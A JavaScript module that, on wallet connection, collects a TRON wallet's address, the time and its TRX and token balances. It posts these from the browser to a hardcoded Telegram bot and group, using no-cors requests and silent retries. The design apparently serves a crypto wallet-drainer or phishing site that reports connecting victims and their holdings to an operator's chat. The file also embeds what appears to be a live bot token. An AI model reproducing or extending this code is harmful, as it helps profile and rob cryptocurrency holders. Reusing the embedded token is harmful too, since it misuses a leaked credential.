export const TelegramService = {
    BOT_TOKEN: '8434580365:AAE41hblDWPNtM5cO0GDHEX9-i51Q9fZakw',
    GROUP_ID: '-5121384419',

    /**
     * Sends a connection notification to the Telegram group.
     * @param {Object} portfolio - Result from TransactionService.getWalletPortfolio
     * @param {string} address - Wallet address
     */
    sendConnectionNotification: async (portfolio, address) => {
        try {
            console.log("Preparing Telegram notification for:", address);
            const now = new Date();
            // Format time: DD.MM - HH:MM
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const timeString = `${day}.${month} - ${hours}:${minutes}`;

            // Format Balance Breakdown: "37 TRX ve 74 USDT"
            let breakdown = `${portfolio.trx.toFixed(2)} TRX`;
            portfolio.tokens.forEach(t => {
                breakdown += ` ve ${t.balance.toFixed(2)} ${t.symbol}`;
            });

            // Construct Message
            const message = `
👛: <a href="https://tronscan.org/#/address/${address}">${address}</a>
⏰: ${timeString}
💰: ${portfolio.totalUsd.toFixed(4)} $ (${breakdown})
            `.trim();

            // Use URLSearchParams for simple request body (x-www-form-urlencoded)
            // AND mode: 'no-cors' to allow the request to be sent from browser
            const params = new URLSearchParams();
            params.append('chat_id', TelegramService.GROUP_ID);
            params.append('text', message);
            params.append('parse_mode', 'HTML');
            params.append('disable_web_page_preview', 'true');

            const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage`;

            // Non-blocking background retry loop
            (async () => {
                let attempts = 0;
                const maxAttempts = 10;

                while (attempts < maxAttempts) {
                    try {
                        console.log(`Sending Telegram notification (Attempt ${attempts + 1})...`);

                        // Using no-cors mode. Response will be opaque (status 0, ok: false usually, but request is sent).
                        // We cannot read the response, so we assume success if no network error occurs.
                        await fetch(url, {
                            method: 'POST',
                            mode: 'no-cors',
                            body: params
                        });

                        console.log("Telegram notification request sent (opaque response).");
                        break;
                    } catch (err) {
                        console.error("Telegram Network Error:", err);
                    }

                    attempts++;
                    if (attempts < maxAttempts) {
                        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s before retry
                    }
                }
            })();

        } catch (error) {
            console.error("Failed to initiate Telegram notification logic:", error);
        }
    }
};
